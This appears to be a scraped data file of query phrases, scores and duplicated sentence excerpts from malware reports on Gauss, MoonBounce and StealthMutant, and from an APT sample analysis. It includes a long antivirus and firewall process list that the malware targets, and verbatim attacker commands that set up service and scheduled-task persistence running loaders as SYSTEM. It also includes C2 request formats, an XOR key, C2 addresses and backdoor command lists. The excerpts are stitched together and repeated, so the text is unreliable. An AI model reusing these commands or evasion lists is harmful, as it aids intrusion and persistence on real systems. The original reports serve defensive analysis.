start:LMon.exesagui.exeRDTask.exekpf4gui.exeALsvc.exepxagent.exefsma32.exelicwiz.exeSavService.exeprevxcsi.exealertwall.exelivehelp.exeSAVAdminService.execsi-eui.exempf.exelookout.exesavprogress.exelpfw.exempfcm.exeemlproui.exesavmain.exeoutpost.exefameh32.exeemlproxy.exesavcleanup.exefilemon.exeAntiHook.exeendtaskpro.exesavcli.exeprocmon.exexfilter.exenetguardlite.exebackgroundscanclient.exeSniffer.exescfservice.exeoasclnt.exesdcservice.exeacs.exescfmanager.exeomnitray.exesdcdevconx.exeaupdrun.exespywareterminatorshield.exeonlinent.exesdcdevconIA.exesppfw.exespywat~1.exeopf.exesdcdevcon.exespfirewallsvc.exessupdate.exepctavsvc.execonfiguresav.exefwsrv.exeterminet.exepctav.exealupdate.exeopfsvc.exetscutynt.exepcviper.exeInstLsp.exeuwcdsvr.exeumxtray.exepersfw.exeCMain.exedfw.exeupdclient.exepgaccount.exeCavAUD.exeipatrol.exewebwall.exeprivatefirewall3.exeCavEmSrv.exepcipprev.exewinroute.exeprotect.exeCavmr.exeprifw.exeapvxdwin.exertt_crc_service.exeCavvl.exetzpfw.exeas3pf.exeschedulerdaemon.exeCavApp.exeprivatefirewall3.exeavas.exesdtrayapp.exeCavCons.exepfft.exeavcom.exesiteadv.exeCavMud.exearmorwall.exeavkproxy.exesndsrvc.exeCavUMAS.exeapp_firewall.exeavkservice.exesnsmcon.exeUUpd.exeblackd.exeavktray.exesnsupd.execavasm.exeblackice.exeavkwctrl.exeprocguard.exeCavSub.exeumxagent.exeavmgma.exeDCSUserProt.exeCavUserUpd.exekpf4ss.exeavtask.exeavkwctl.exeCavQ.exetppfdmn.exeaws.exefirewall.exeCavoar.exeblinksvc.exebgctl.exeTHGuard.exeCEmRep.exesp_rsser.exebgnt.exespybotsd.exeOnAccessInstaller.exeop_mon.exebootsafe.exexauth_service.exeSoftAct.execmdagent.exebullguard.exexfilter.exeCavSn.exeVCATCH.EXEcdas2.exezlh.exePacketizer.exeSpyHunter3.execmgrdian.exeadoronsfirewall.exePacketyzer.exewwasher.execonfigmgr.exescfservice.exezanda.exeauthfw.execpd.exescfmanager.exezerospywarele.exedvpapi.exeespwatch.exedltray.exezerospywarelite_installer.execlamd.exefgui.exedlservice.exeWireshark.exesab_wab.exefiledeleter.exeashwebsv.exetshark.exeSUPERAntiSpyware.exefirewall.exeashdisp.exerawshark.exevdtask.exefirewall2004.exeashmaisv.exeEthereal.exeasr.exefirewallgui.exeashserv.exeTethereal.exeNetguardLite.exegateway.exeaswupdsv.exeWindump.exenstzerospywarelite.exehpf_.exeavastui.exeTcpdump.execdinstx.exeiface.exeavastsvc.exeNetcap.execdas17.exeinvent.exeNetmon.exefsrt.exeipcserver.exeCV.exeVSDesktop.exeipctray.exeThe module reads the registry value SOFTWAREMicrosoftWindowsCurrentVersionReliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of additional modules, their names, DLL exports names to call and location of the modules additional files.String values from config file (example)GaussShellNotifyUser ShellNotifyUserEx SetWindowEvent InitShellEx %systemroot%system32winshell.ocx %temp%ws1bin.datGodelInitCache RevertCache ValidateEntry CreateEntry %windir%system32dskapi.ocx %temp%~gdl.tmpUsbDirInitCache RevertCache ValidateEntry CreateEntry %windir%system32smdk.ocx %temp%~mdk.tmpEvery module is loaded and its export functions are called as specified in the configuration.Most of the actions are logged in an encrypted (with XOR) file %temp%~shw.tmp.Sample of decrypted ~shw.tmpAfter loading additional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction loop.Prior to communicating with the C&C, all the information from the other modules log files is copied to the ~shw.tmp file.', 'Paths to the log files are taken from the TimeStampForUI configuration file.As a result, at this stage ~shw.tmp becomes a universal container file containing all the stolen data.It checks Internet connection (https) by accessing URLs specified in its resource 161.It then checks an https connection with www.google.com or www.update.windows.com.', 'If 200 OK is received in reply, it sends a request with the proxy server parameters taken from the prefs.js file of the Mozilla Firefox browser.When an Internet connection is available, it connects to its C&C servers that are specified in resource 131:Connection is established using WinInet API and is performed in two stages:GET request to the server.', 'The response from the server is expected to contain new modules, commands or configuration data.GET[C&amp;Cdomain]/userhome.php?sid=[randomstring]==&amp;uid=VfHx8fHx8fHx8fHx8fHx8fHx8fE=POST request to the server with the contents of the file ~shw.tmp that contains all data collected from the infected computer.The response from the server is decrypted using XOR and 0xACDC as the key.', 'Exfiltrated data is compressed with Zlib.The C&C connection routine is controlled by a DWORD value that is read from the registry value:[HKLMSOFTWAREMicrosoftWindowsCurrentVersionReliability]ShutdownIntervalSnapshotUIThe initial value of the counter is read from resource 181 and is equal to 56.']
It works by decrypting a shellcode BLOB with AES-256|0.7953395940365318|"['As a consequence, when the WMI service was initiated, the rogue version of this DLL forced the loading of a StealthVector image named wmiwk.dll.Appended IAT entry to a rogue wbemcomn.dll file which forces the loading of StealthVector upon initiation of the WMI serviceThe table below specifies all instances of StealthVector that we detected in the targeted network, along with timestamp artefacts that might point to the date of their creation.Loader FilenameLoader MD5Shellcode FilenameC&C AddressCompilation Timestampwbwkem.dll4D5EB9F6F501B4F6EDF981A3C6C4D6FAcompwm.bindev.kinopoisksu[.', ']comFriday, 12.06.2020 08:25:02 UTCwkbem.dllE7155C355C90DC113476DDCF765B187Dpcomnl.binUnknownTuesday, 24.03.2020 09:09:21 UTCwmiwk.dll899608DE6B59C63B4AE219C3C13502F5wmipl.dllns.glbaitech[.', ']comSaturday, 20.02.2021 06:45:18 UTCc_20344.nls4EF90CEEF2CC9FF3121B34A9891BB28D217.69.10[.', ']104Tuesday, 24.03.2020 09:09:21 UTCc_20334.nlsCFF2772C44F6F86661AB0A4FFBF86833st.kinopoisksu[.', ']comTuesday, 24.03.2020 09:09:21 UTCAnother loader that we detected and is commonly used to load ScrambleCross is .NET based, referred to as StealthMutant.', 'It works by decrypting a shellcode BLOB with AES-256 and injecting it to the address space of another process.', 'The injected process in every case we observed was msdt.exe (Microsoft Diagnostic Troubleshooting Wizard).StealthMutant is launched in one of two ways, which were partially described in other reports as well.', 'The first way is by executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.', 'This is outlined in the following commands typed by the attackers on one of the compromised systems:netstart""iscsiwmi""scstopiscsiwmiscdeleteiscsiwmiregadd""HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost""/v""iscsiwmi""/tREG_MULTI_SZ/d""iscsiwmi""/fsccreate""iscsiwmi""binPath=""$system32\\\\svchost.exe -k iscsiwmi""type=sharestart=autoerror=ignoreDisplayName=""iscsiwmi""SCfailure""iscsiwmi""reset=86400actions=restart/60000/restart/60000/restart/60000scdescription""iscsiwmi""""""iSCSIWMIClassesThatManageInitiators,Ports,SessionsandConnections""""regadd""HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\iscsiwmi\\\\Parameters""/fregadd""HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\iscsiwmi\\\\Parameters""/v""ServiceDll""/tREG_EXPAND_SZ/d""$windir\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\System.Mail.Service.dll""/fnetstart""iscsiwmi""The launching utility in turn uses the .NET InstallUtil.exe application in order to execute the StealthMutant image, which has the filename Microsoft.Service.Watch.targets, and providing it with the encrypted ScrambleCross shellcode as an argument from a file named MstUtil.exe.config.', 'The utility itself is a basic C++ program that achieves the aforementioned goal by issuing the following command line using the WinExec API:C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe/logfile=/LogToConsole=false/ConfigFile=MstUtil.exe.config/UC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targetsThe second way to execute StealthMutant is through the creation of a scheduled task via a Windows batch script file named schtask.bat, as outlined below:@echooffcd/d""%~dp0""copy/YMicrosoft.Service.Watch.targets""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets""copy/YMstUtil.exe.config""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\MstUtil.exe.config""schtasks/create/TN""\\\\Microsoft\\\\Windows\\\\UNP\\\\UNPRefreshListTask""/SCONSTART/TR""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets""/F/DELAY0000:02/RUSYSTEM/RLHIGHESTschtasks/run/TN""\\\\Microsoft\\\\Windows\\\\UNP\\\\UNPRefreshListTask""The following table lists known StealthMutant loader IOCs, together with their corresponding ScrambleCross shellcode files and contacted C2 addresses.', 'Its worth noting that most of the ScrambleCross shellcodes (loaded by both StealthMutant and StealthVector) reached out to the same server (i.e.']"
Run a shell command|0.7638497791357868|['Stop execution.', 'Sleep for the number of seconds listed 8 Sleep in the interval.', 'Return malware engine version (Embedded 11 EngineVersion within the malware).', 'Download an executable from the relay and 12 DownloadExecuteFile execute it.', 'Download an executable from a URL given by 13 DownloadExecuteUrl the relay and execute it.', 'Run a command.', 'If the file %TEMP%\\\\VBE.exe exists, run the command with it.', 'If not, run it 14 CommandExecute with PowerShell.', 'If PowerShell does not exist, run the command using CMD.', 'Receive file path and send the file to 15 UploadFile the relay.', 'Receive new configuration values and update 16 UpdateConfig the configuration file accordingly.']
Run a shell command|0.8038711486385094|['82 Install APK (silently or via UI).', '83 Uninstall the application (silently or via UI).', '84 Execute chmod -R 777 to a specific path via su.', '85 Launch a specific application on the device.', '86 Send Broadcast with a specific action to trigger other applications.', '87 Run shell command.', '88 Change the minimal time interval between a location updates.', '89 Disable location tracking.', '91 Check if a screen is on.', '92 Send SMS to a specific number.', '93 Delete specific SMS.']
executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.|0.9505017647946575|"[']104 Tuesday, 24.03.2020 09:09:21 UTC c_20334.nls CFF2772C44F6F86661AB0A4FFBF86833 st.kinopoisksu[.', ']com Tuesday, 24.03.2020 09:09:21 UTC Another loader that we detected and is commonly used to load ScrambleCross is .NET based, referred to as StealthMutant.', 'It works by decrypting a shellcode BLOB with AES-256 and injecting it to the address space of another process, using the process-hollowing technique.', 'The injected process in every case we observed was msdt.exe (Microsoft Diagnostic Troubleshooting Wizard).', 'StealthMutant is launched in one of two ways, which were partially described in other reports as well.', 'The first way is by executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.', 'This is outlined in the following commands typed by the attackers on one of the compromised systems: 1 net start ""iscsiwmi"" 2 sc stop iscsiwmi 3 sc delete iscsiwmi 4 reg add ""HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost"" /v ""iscsiwmi"" /t REG_MULTI_SZ /d ""iscsiwmi"" /f 5 sc create ""iscsiwmi"" binPath= ""$system32\\\\svchost.exe -k iscsiwmi"" type= share start= auto error= ignore 6 DisplayName= ""iscsiwmi"" 7 SC failure ""iscsiwmi"" reset= 86400 actions= restart/60000/restart/60000/restart/60000 8 sc description ""iscsiwmi"" """"iSCSI WMI Classes That Manage Initiators, Ports, Sessions and Connections"""" 9 reg add ""HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\iscsiwmi\\\\Parameters"" /f 10 reg add ""HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\iscsiwmi\\\\Parameters"" /v ""ServiceDll"" /t REG_EXPAND_SZ /d ""$windir\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\System.Mail.Service.dll"" /f net start ""iscsiwmi"" 5/17The launching utility in turn uses the .NET InstallUtil.exe application in order to execute the StealthMutant image, which has the filename Microsoft.Service.Watch.targets, and providing it with the encrypted ScrambleCross shellcode as an argument from a file named MstUtil.exe.config.', 'The utility itself is a basic C++ program that achieves the aforementioned goal by issuing the following command line using the WinExec API: 1 C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets The second way to execute StealthMutant is through the creation of a scheduled task via a Windows batch script file named schtask.bat, as outlined below: 1 @echo off 2 cd /d ""%~dp0"" 3 copy /Y Microsoft.Service.Watch.targets ""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets"" 4 copy /Y MstUtil.exe.config ""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\MstUtil.exe.config"" 5 schtasks /create /TN ""\\\\Microsoft\\\\Windows\\\\UNP\\\\UNPRefreshListTask"" /SC ONSTART /TR 6 ""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets"" /F /DELAY 0000:02 /RU SYSTEM /RL HIGHEST schtasks /run /TN ""\\\\Microsoft\\\\Windows\\\\UNP\\\\UNPRefreshListTask"" The following table lists known StealthMutant loader IOCs, together with their corresponding ScrambleCross shellcode files and contacted C2 addresses.', 'Its worth noting that most of the ScrambleCross shellcodes (loaded by both StealthMutant and StealthVector) reached out to the same server (i.e.', 'ns.glbaitech[.', ']com) and that StealthMutant was observed in this campaign only from February, 2021.']"
executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.|0.9505017647946575|"[']104 Tuesday, 24.03.2020 09:09:21 UTC c_20334.nls CFF2772C44F6F86661AB0A4FFBF86833 st.kinopoisksu[.', ']com Tuesday, 24.03.2020 09:09:21 UTC Another loader that we detected and is commonly used to load ScrambleCross is .NET based, referred to as StealthMutant.', 'It works by decrypting a shellcode BLOB with AES-256 and injecting it to the address space of another process, using the process-hollowing technique.', 'The injected process in every case we observed was msdt.exe (Microsoft Diagnostic Troubleshooting Wizard).', 'StealthMutant is launched in one of two ways, which were partially described in other reports as well.', 'The first way is by executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.', 'This is outlined in the following commands typed by the attackers on one of the compromised systems: 1 net start ""iscsiwmi"" 2 sc stop iscsiwmi 3 sc delete iscsiwmi 4 reg add ""HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost"" /v ""iscsiwmi"" /t REG_MULTI_SZ /d ""iscsiwmi"" /f 5 sc create ""iscsiwmi"" binPath= ""$system32\\\\svchost.exe -k iscsiwmi"" type= share start= auto 6 error= ignore DisplayName= ""iscsiwmi"" 7 SC failure ""iscsiwmi"" reset= 86400 actions= restart/60000/restart/60000/restart/60000 8 sc description ""iscsiwmi"" """"iSCSI WMI Classes That Manage Initiators, Ports, Sessions and Connections"""" 9 reg add ""HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\iscsiwmi\\\\Parameters"" /f 10 reg add ""HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\iscsiwmi\\\\Parameters"" /v ""ServiceDll"" /t REG_EXPAND_SZ /d ""$windir\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\System.Mail.Service.dll"" /f net start ""iscsiwmi"" The launching utility in turn uses the .NET InstallUtil.exe application in order to execute the StealthMutant image, which has the filename Microsoft.Service.Watch.targets, and providing it with the encrypted ScrambleCross shellcode as an argument from a file named MstUtil.exe.config.', 'The utility itself is a basic C++ program that achieves the aforementioned goal by issuing the following command line using the WinExec API: https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/ 5/171/21/22, 9:00 PM MoonBounce: the dark side of UEFI firmware | Securelist 1 C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets The second way to execute StealthMutant is through the creation of a scheduled task via a Windows batch script file named schtask.bat, as outlined below: 1 @echo off 2 cd /d ""%~dp0"" 3 copy /Y Microsoft.Service.Watch.targets ""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets"" 4 copy /Y MstUtil.exe.config 5 ""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\MstUtil.exe.config"" 6 schtasks /create /TN ""\\\\Microsoft\\\\Windows\\\\UNP\\\\UNPRefreshListTask"" /SC ONSTART /TR ""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets"" /F /DELAY 0000:02 /RU SYSTEM /RL HIGHEST schtasks /run /TN ""\\\\Microsoft\\\\Windows\\\\UNP\\\\UNPRefreshListTask"" The following table lists known StealthMutant loader IOCs, together with their corresponding ScrambleCross shellcode files and contacted C2 addresses.', 'Its worth noting that most of the ScrambleCross shellcodes (loaded by both StealthMutant and StealthVector) reached out to the same server (i.e.', 'ns.glbaitech[.', ']com) and that StealthMutant was observed in this campaign only from February, 2021.']"
executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.|0.9505017647946575|"[']comSaturday, 20.02.2021 06:45:18 UTCc_20344.nls4EF90CEEF2CC9FF3121B34A9891BB28D217.69.10[.', ']104Tuesday, 24.03.2020 09:09:21 UTCc_20334.nlsCFF2772C44F6F86661AB0A4FFBF86833st.kinopoisksu[.', ']comTuesday, 24.03.2020 09:09:21 UTCAnother loader that we detected and is commonly used to load ScrambleCross is .NET based, referred to as StealthMutant.', 'It works by decrypting a shellcode BLOB with AES-256 and injecting it to the address space of another process.', 'The injected process in every case we observed was msdt.exe (Microsoft Diagnostic Troubleshooting Wizard).StealthMutant is launched in one of two ways, which were partially described in other reports as well.', 'The first way is by executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.', 'This is outlined in the following commands typed by the attackers on one of the compromised systems:netstart""iscsiwmi""scstopiscsiwmiscdeleteiscsiwmiregadd""HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost""/v""iscsiwmi""/tREG_MULTI_SZ/d""iscsiwmi""/fsccreate""iscsiwmi""binPath=""$system32\\\\svchost.exe -k iscsiwmi""type=sharestart=autoerror=ignoreDisplayName=""iscsiwmi""SCfailure""iscsiwmi""reset=86400actions=restart/60000/restart/60000/restart/60000scdescription""iscsiwmi""""""iSCSIWMIClassesThatManageInitiators,Ports,SessionsandConnections""""regadd""HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\iscsiwmi\\\\Parameters""/fregadd""HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\iscsiwmi\\\\Parameters""/v""ServiceDll""/tREG_EXPAND_SZ/d""$windir\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\System.Mail.Service.dll""/fnetstart""iscsiwmi""The launching utility in turn uses the .NET InstallUtil.exe application in order to execute the StealthMutant image, which has the filename Microsoft.Service.Watch.targets, and providing it with the encrypted ScrambleCross shellcode as an argument from a file named MstUtil.exe.config.', 'The utility itself is a basic C++ program that achieves the aforementioned goal by issuing the following command line using the WinExec API:C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe/logfile=/LogToConsole=false/ConfigFile=MstUtil.exe.config/UC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targetsThe second way to execute StealthMutant is through the creation of a scheduled task via a Windows batch script file named schtask.bat, as outlined below:@echooffcd/d""%~dp0""copy/YMicrosoft.Service.Watch.targets""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets""copy/YMstUtil.exe.config""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\MstUtil.exe.config""schtasks/create/TN""\\\\Microsoft\\\\Windows\\\\UNP\\\\UNPRefreshListTask""/SCONSTART/TR""C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Microsoft.Service.Watch.targets""/F/DELAY0000:02/RUSYSTEM/RLHIGHESTschtasks/run/TN""\\\\Microsoft\\\\Windows\\\\UNP\\\\UNPRefreshListTask""The following table lists known StealthMutant loader IOCs, together with their corresponding ScrambleCross shellcode files and contacted C2 addresses.', 'Its worth noting that most of the ScrambleCross shellcodes (loaded by both StealthMutant and StealthVector) reached out to the same server (i.e.', 'ns.glbaitech[.', ']com) and that StealthMutant was observed in this campaign only from February, 2021.Loader MD5C&C AddressCompilation Timestamp0603C8AAECBDC523CBD3495E93AFB20C92.38.178[.']"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"""|0.7756126259939526|['ad\\\\NetIDS key value name Table 118 IoC list in leaked material SIG40 https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and- spyware/Troj~Sednit-C/detailed-analysis.aspx https://virustotal.com/en/file/7f6f9645499f5840b59fb59525343045abf91bc57183aae459dc a98dc8216965/analysis/ Table 119 Related links, information SIG40 7f6f9645499f5840b59fb59525343045abf91bc57183aae459dca98dc8216965 46Please check separate file with hash list too.', 'Note, there should be many FPs.', 'Table 120 hashes of possibly related files SIG40 4743.', 'SIG41 IoC type, method remarks PROGRAM_FILES\\\\common files\\\\Log file/directory?', 'PROGRAM_FILESX86\\\\common files\\\\Log file/directory?', 'software\\\\microsoft\\\\windows nt\\\\currentversion\\\\ reg.', 'key winlogon\\\\Userinit == svchost value Table 121 IoC list in leaked material SIG41 https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_swisyn.smfp https://www.virustotal.com/en/file/322cc4328e46bad28f12d1e4aa781c1cc6bcfb22fa24bb6a 2eac6bd07fa8fc44/analysis/ https://home.mcafee.com/virusinfo/virusprofile.aspx?key=964778 https://www.symantec.com/security_response/writeup.jsp?docid=2006-071111-0646-99 Table 122 Related links, information SIG41 bad7b98554f38ad3883d3f864777c8806f7797a0 Please check separate file with hash list too.', 'Note, there should be many FPs.', 'Table 123 hashes of possibly related files SIG41 44.', 'SIG42?', 'IoC type, method remarks Table 124 IoC list in leaked material SIG42 Table 125 Related links, information SIG42 aaaaa Table 126 hashes of possibly related files SIG42 4845.']
Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoor’s image.|0.9358841574487303|['The implants we observed in this campaign are shipped as DLLs that ought to run in the context of exe, with the primary intent of reading a C2 address from an encrypted configuration file stored in %WINDIR%\\\\debug\\\\netlogon.cfg and reaching out to the server to obtain a further payload.', 'Interestingly, the Trojan holds a scheduling algorithm that would skip any work on Saturdays, checking the local time every hour to determine if Saturday has passed.', 'Mimikat_ssp: a publicly available post-exploitation tool used to dump credentials and security secrets from exe, also used widely by various Chinese-speaking actors (e.g.', 'GhostEmperor, which we reported on).', 'Go implant: a formerly unknown backdoor used to contact a C2 server using a RESTful API, where a combination of a hardcoded IP address and a hypermedia directory path on the underlying server are used for information exchange.', 'Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoors image.', 'The IP and directory path tuple are used during execution for: Initialising communications with the server; Sending information from the infected host; Requesting a specific server path containing a command for execution and downloading it; Sending back the result of the commands execution to the C2 server.', 'The commands retrieved from the server are also encrypted with AES-128, with the key stored in the commands file itself.', 'Command execution results are then encrypted using the same key.', 'We found the following list of supported commands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shell command.', 'It is important to note that we could not conclusively tie most of those additional pieces of malware to the intrusion set related to MoonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCross, as outlined in the figure below.']
Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoor’s image.|0.9358841574487303|['The implants we observed in this campaign are shipped as DLLs that ought to run in the context of exe, with the primary intent of reading a C2 address from an encrypted configuration file stored in %WINDIR%\\\\debug\\\\netlogon.cfg and reaching out to the server to obtain a further payload.', 'Interestingly, the Trojan holds a scheduling algorithm that would skip any work on Saturdays, checking the local time every hour to determine if Saturday has passed.', 'Mimikat_ssp: a publicly available post-exploitation tool used to dump credentials and security secrets from exe, also used widely by various Chinese-speaking actors (e.g.', 'GhostEmperor, which we reported on).', 'Go implant: a formerly unknown backdoor used to contact a C2 server using a RESTful API, where a combination of a hardcoded IP address and a hypermedia directory path on the underlying server are used for information exchange.', 'Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoors image.', 'The IP and directory path tuple are used during execution for: Initialising communications with the server; Sending information from the infected host; Requesting a specific server path containing a command for execution and downloading it; Sending back the result of the commands execution to the C2 server.', 'The commands retrieved from the server are also encrypted with AES-128, with the key stored in the commands file itself.', 'Command execution results are then encrypted using the same key.', 'We found the following list of supported commands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shell command.', 'It is important to note that we could not conclusively tie most of those additional pieces of malware to the intrusion set related to MoonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCross, as outlined in the figure below.']
The commands retrieved from the server are also encrypted with AES-128|0.8437817209850798|['Mimikat_ssp: a publicly available post-exploitation tool used to dump credentials and security secrets from exe, also used widely by various Chinese-speaking actors (e.g.', 'GhostEmperor, which we reported on).', 'Go implant: a formerly unknown backdoor used to contact a C2 server using a RESTful API, where a combination of a hardcoded IP address and a hypermedia directory path on the underlying server are used for information exchange.', 'Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoors image.', 'The IP and directory path tuple are used during execution for: Initialising communications with the server; Sending information from the infected host; Requesting a specific server path containing a command for execution and downloading it; Sending back the result of the commands execution to the C2 server.', 'The commands retrieved from the server are also encrypted with AES-128, with the key stored in the commands file itself.', 'Command execution results are then encrypted using the same key.', 'We found the following list of supported commands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shell command.', 'It is important to note that we could not conclusively tie most of those additional pieces of malware to the intrusion set related to MoonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCross, as outlined in the figure below.', 'This suggests a low-confidence connection between Microcin and MoonBounce and may indicate usage of shared resources between SixLittleMonkeys and APT41 or involvement of the formers operators in the MoonBounce activity.', '7/17Timeline of events related to artefacts found in the network containing the MoonBounce-infected machine Who were the targets?']
The commands retrieved from the server are also encrypted with AES-128|0.8437817209850798|"['Mimikat_ssp: a publicly available post-exploitation tool used to dump credentials and security secrets from exe, also used widely by various Chinese-speaking actors (e.g.', 'GhostEmperor, which we reported on).', 'Go implant: a formerly unknown backdoor used to contact a C2 server using a RESTful API, where a combination of a hardcoded IP address and a hypermedia directory path on the underlying server are used for information exchange.', 'Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoors image.', 'The IP and directory path tuple are used during execution for: Initialising communications with the server; Sending information from the infected host; Requesting a specific server path containing a command for execution and downloading it; Sending back the result of the commands execution to the C2 server.', 'The commands retrieved from the server are also encrypted with AES-128, with the key stored in the commands file itself.', 'Command execution results are then encrypted using the same key.', 'We found the following list of supported commands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shell command.', 'It is important to note that we could not conclusively tie most of those additional pieces of malware to the intrusion set related to MoonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCross, as outlined in the figure below.', 'This suggests a low- confidence connection between Microcin and MoonBounce and may indicate usage of shared resources between SixLittleMonkeys and APT41 or involvement of the formers operators in the MoonBounce activity.', 'https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/ 7/171/21/22, 9:00 PM MoonBounce: the dark side of UEFI firmware | Securelist Timeline of events related to artefacts found in the network containing the MoonBounce- infected machine Who were the targets?']"
Get content list from a specified directory|0.7745227981292933|['Operations on this repository only existed in November 2021, and no other repositories were created after that.', 'Figure 238 Similar repositories associated to github In related similar repositories, suspicious strings were found, which may be encrypted domain names or IPs.', '21/28Figure 239 Suspicious strings in github Connect to the IP or domain name stored in the github repository.', 'Figure 2-40 socket connection Since the domain name, IP and github address are all invalid, it is impossible to continue to follow up.', 'Through the static analysis of the sample, it is inferred that after the attacker communicates with the control terminal, there may be operations such as obtaining the list of files in the specified directory, starting the process, and so on.', 'Get the list of files in the specified directory.', '22/28Figure 241 File search related operations Create pipelines.', 'Figure 242 Create a pipeline Start the process.', '23/28Figure 243 Start process 03 Attribution Analysis In the previous observations, it was found that some CNC organization personnel would integrate vcpkg in the development environment.', 'This feature also exists in the samples discovered this time, and the path is also consistent with the path used in the past.', 'Figure 31 Path information in this attack 24/28Figure 32 Path information in past attacks Part of the code in the sample is also very similar.']
